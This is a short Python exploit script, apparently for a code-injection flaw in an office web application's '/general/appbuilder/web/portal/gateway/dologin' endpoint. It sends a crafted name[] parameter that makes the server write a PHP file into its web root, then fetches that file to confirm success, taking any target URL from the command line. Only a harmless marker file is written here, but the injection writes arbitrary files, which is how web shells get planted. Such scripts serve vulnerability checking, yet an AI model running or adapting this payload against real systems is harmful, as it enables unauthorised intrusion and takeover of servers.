#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()
import requests


def verify(site):
    burp0_url =  site + '/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print(file_put_contents("../../../vulntest.php",base64_decode("dnVsbnRlc3Q="))),//'
    burp0_headers = {"User-Agent": "Moziilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Content-Type": "application/x-www-form-urlencoded"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    shellpath = site + "/vulntest.php"
    r2 = requests.get(shellpath, verify=False)
    if r2.status_code == 200 and "vulntest" in r2.text:
        return shellpath
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件写入的路径为：", info)
    else:
        print("[-]漏洞不存在")
